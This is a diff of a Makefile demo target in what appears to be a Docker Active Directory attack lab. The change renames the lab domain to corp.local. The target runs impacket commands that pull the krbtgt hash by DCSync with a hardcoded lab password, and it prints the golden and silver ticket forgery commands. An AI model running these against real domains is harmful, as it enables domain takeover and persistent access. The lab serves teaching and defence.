@@ -16,22 +16,22 @@ shell:
 demo:       ## Demonstrate golden ticket creation and DCSync persistence
 	@echo "=== Waiting for DC... ==="
 	docker compose exec attacker sh -c \
-	    'until python3 -c "import socket; socket.create_connection((\"dc01.meridian.local\", 445), 3)" 2>/dev/null; do sleep 3; done; echo "DC ready."'
+	    'until python3 -c "import socket; socket.create_connection((\"dc01.corp.local\", 445), 3)" 2>/dev/null; do sleep 3; done; echo "DC ready."'
 	@echo ""
 	@echo "=== 1. Extract krbtgt hash via DCSync ==="
 	docker compose exec attacker \
-	    secretsdump.py MERIDIAN.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.meridian.local \
+	    secretsdump.py CORP.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.corp.local \
 	    -just-dc-user krbtgt 2>/dev/null | grep "krbtgt:" || \
-	    echo "[note] Run: secretsdump.py MERIDIAN.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.meridian.local -just-dc-user krbtgt"
+	    echo "[note] Run: secretsdump.py CORP.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.corp.local -just-dc-user krbtgt"
 	@echo ""
 	@echo "=== 2. Golden ticket — forge a TGT for a phantom admin ==="
-	@echo "   ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain MERIDIAN.LOCAL -groups 512 phantom_admin"
+	@echo "   ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain CORP.LOCAL -groups 512 phantom_admin"
 	@echo "   export KRB5CCNAME=phantom_admin.ccache"
-	@echo "   secretsdump.py -k -no-pass dc01.meridian.local"
+	@echo "   secretsdump.py -k -no-pass dc01.corp.local"
 	@echo ""
 	@echo "=== 3. Silver ticket — forge a service ticket (no KDC contact) ==="
-	@echo "   ticketer.py -nthash <SVC_MSSQL_HASH> -domain-sid <DOMAIN_SID> -domain MERIDIAN.LOCAL"
-	@echo "              -spn MSSQLSvc/db01.meridian.local:1433 -user-id 500 Administrator"
+	@echo "   ticketer.py -nthash <SVC_MSSQL_HASH> -domain-sid <DOMAIN_SID> -domain CORP.LOCAL"
+	@echo "              -spn MSSQLSvc/db01.corp.local:1433 -user-id 500 Administrator"
 	@echo ""
 	@echo "=== 4. Persistence mechanisms summary ==="
 	@echo "   Golden ticket:  krbtgt hash needed; survives password resets; expired only by 2x krbtgt rotation"
